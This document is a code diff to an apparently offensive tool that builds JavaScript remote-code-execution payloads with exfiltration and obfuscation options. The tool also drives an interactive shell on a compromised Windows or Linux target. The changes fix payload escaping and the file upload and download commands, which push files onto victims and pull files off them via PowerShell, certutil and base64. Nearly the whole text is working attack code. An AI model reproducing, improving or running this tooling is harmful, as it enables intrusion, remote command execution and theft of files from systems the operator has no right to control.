@@ -113,7 +113,7 @@ class PayloadStrategy:
     @staticmethod
     def js_rce(cmd,exfil='redirect',obf_level=0,**kw):
         """Build the JS code that goes into _prefix."""
-        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
+        ce=cmd.replace("\\","\\\\\\\\").replace("'","\\\\'").replace('"','\\"')
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
@@ -137,7 +137,7 @@ class PayloadStrategy:
     @staticmethod
     def js_rce_truncated(cmd,max_bytes=4000,exfil='redirect',obf_level=0,**kw):
         """Like js_rce but truncates output server-side for large commands."""
-        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
+        ce=cmd.replace("\\","\\\\\\\\").replace("'","\\\\'").replace('"','\\"')
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
@@ -849,37 +849,41 @@ class AdvancedShell:
                         if len(p)<3:print(f"Usage: .upload <local_path> <remote_path>");continue
                         lp,rp=p[1],p[2]
                         if not os.path.isfile(lp):print(f"{R}Local file not found: {lp}{W}");continue
+                        # If remote path is a directory, append filename
+                        if rp.endswith('\\') or rp.endswith('/'):rp+=os.path.basename(lp)
+                        elif self.target_os=='windows' and ('\\' in rp or '/' in rp) and '.' not in rp.split('\\')[-1].split('/')[-1]:
+                            rp=rp.rstrip('\\').rstrip('/')+'\\'+os.path.basename(lp)
+                        # Convert Windows paths to forward slashes
+                        rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
                         data=open(lp,'rb').read()
                         b64=base64.b64encode(data).decode()
-                        fsize=len(data);print(f"{Y}[*] Uploading {lp} → {rp} ({fsize}B, {len(b64)}B base64){W}")
+                        fsize=len(data);print(f"{Y}[*] Uploading {lp} → {rp_safe} ({fsize}B, {len(b64)}B base64){W}")
                         CHUNK=1500  # base64 chars per chunk
                         chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
                         if self.target_os=='windows':
-                            # Use PowerShell to decode base64
                             if len(chunks)==1:
-                                o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\'{rp}\',[Convert]::FromBase64String(\'{b64}\'))"')
+                                o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\"{rp_safe}\",[Convert]::FromBase64String(\"{b64}\"))"')
                             else:
-                                # Write base64 chunks to temp file then decode
-                                tmp=rp+'.b64'
+                                tmp=rp_safe+'.b64'
                                 for i,chunk in enumerate(chunks):
                                     op='>' if i==0 else '>>'
                                     o=self.execute(f'echo {chunk}{op}"{tmp}"')
                                     if o and '[-]' in o:print(f"{R}Chunk {i+1}/{len(chunks)} failed{W}");break
                                     sys.stdout.write(f"\r  Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
                                 print()
-                                o=self.execute(f'certutil -decode "{tmp}" "{rp}" & del "{tmp}"')
+                                o=self.execute(f'certutil -decode "{tmp}" "{rp_safe}" & del "{tmp}"')
                         else:
                             if len(chunks)==1:
-                                o=self.execute(f"echo '{b64}'|base64 -d > '{rp}'")
+                                o=self.execute(f"echo '{b64}'|base64 -d > '{rp_safe}'")
                             else:
-                                tmp=rp+'.b64'
+                                tmp=rp_safe+'.b64'
                                 for i,chunk in enumerate(chunks):
                                     op='>' if i==0 else '>>'
                                     o=self.execute(f"echo -n '{chunk}'{op}'{tmp}'")
                                     if o and '[-]' in o:print(f"{R}Chunk {i+1}/{len(chunks)} failed{W}");break
                                     sys.stdout.write(f"\r  Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
                                 print()
-                                o=self.execute(f"base64 -d '{tmp}' > '{rp}' && rm '{tmp}'")
+                                o=self.execute(f"base64 -d '{tmp}' > '{rp_safe}' && rm '{tmp}'")
                         if o and '[-]' not in o:print(f"{G}[+] Upload complete: {rp}{W}")
                         else:print(f"{Y}[!] Upload may have failed. Verify with: .cat {rp}{W}")
                     elif cmd.startswith('.download') or cmd.startswith('.dl'):
@@ -887,11 +891,12 @@ class AdvancedShell:
                         if len(p)<2:print("Usage: .download <remote> [local]");continue
                         rp=p[1];lp=p[2] if len(p)>2 else f"dl_{os.path.basename(rp)}"
                         os.makedirs(os.path.dirname(os.path.abspath(lp)) or '.',exist_ok=True)
+                        rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
                         print(f"{Y}[*] Downloading {rp}...{W}")
                         if self.target_os=='windows':
-                            o=self.execute(f'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'{rp}\'))"')
+                            o=self.execute(f'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"{rp_safe}\"))"')
                         else:
-                            o=self.execute(f"base64 -w0 '{rp}'")
+                            o=self.execute(f"base64 -w0 '{rp_safe}'")
                         if o and '[-]' not in o and '[!' not in o:
                             try:
                                 clean=o.strip().replace('\r','').replace('\n','').replace(' ','')
@@ -905,12 +910,11 @@ class AdvancedShell:
                             if path=='..' and self.current_dir:
                                 parts=self.current_dir.rstrip('\\').rsplit('\\',1)
                                 new_dir=parts[0] if len(parts)>1 else self.current_dir
-                                # Bare drive letter 'D:' means current dir on that drive, add \\ for root
                                 if len(new_dir)==2 and new_dir[1]==':':new_dir+='\\'
                             elif path=='.':
                                 new_dir=self.current_dir or ''
-                            elif ':\\' in path or path.startswith('\\\\') or ':/' in path:
-                                new_dir=path
+                            elif ':\\' in path or path.startswith('\\\\') or ':/' in path or (len(path)==2 and path[1]==':'):
+                                new_dir=path if len(path)>2 else path+'\\'
                             elif self.current_dir:
                                 new_dir=self.current_dir.rstrip('\\')+'\\'+path
                             else:
